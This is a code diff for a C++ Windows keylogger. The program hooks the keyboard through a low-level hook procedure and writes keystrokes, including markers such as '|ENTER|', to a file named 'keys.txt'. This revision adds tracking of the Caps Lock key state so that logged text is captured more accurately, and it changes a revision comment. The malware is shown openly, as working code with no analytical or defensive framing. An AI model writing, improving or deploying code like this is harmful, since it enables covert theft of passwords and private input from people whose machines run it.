@@ -14,7 +14,7 @@ bool running = true;
 std::string path = "keys.txt";
 std::ofstream File(path);
 bool _shiftdown = false;
-
+bool _capsdown = false;
 
 
 
@@ -133,6 +133,9 @@ void keyCompareDown_(int nCode, WPARAM wParam, LPARAM lParam) {
 			UnhookWindowsHookEx(hook);
 			exit(0);
 		}
+		else if (pKeyStruct->vkCode == VK_CAPITAL) {
+			_capsdown = true;
+		}
 		else if (pKeyStruct->vkCode == VK_RETURN) {
 			File << " |ENTER| ";
 		}
@@ -156,6 +159,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 	if (nCode >= 0 && (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)) {
 		KBDLLHOOKSTRUCT* pKeyStruct = (KBDLLHOOKSTRUCT*)lParam;
 		if (pKeyStruct->vkCode == VK_SHIFT || pKeyStruct->vkCode == VK_RSHIFT || pKeyStruct->vkCode == VK_LSHIFT) { _shiftdown = false; }
+		if (pKeyStruct->vkCode == VK_CAPITAL) { _capsdown = false; }
 	}
 	keyCompareDown_(nCode,wParam,lParam);
 	return CallNextHookEx(hook, nCode, wParam, lParam);
@@ -178,4 +182,4 @@ int main() {
 }
 
 
-//revised 2
+//REVISION 3
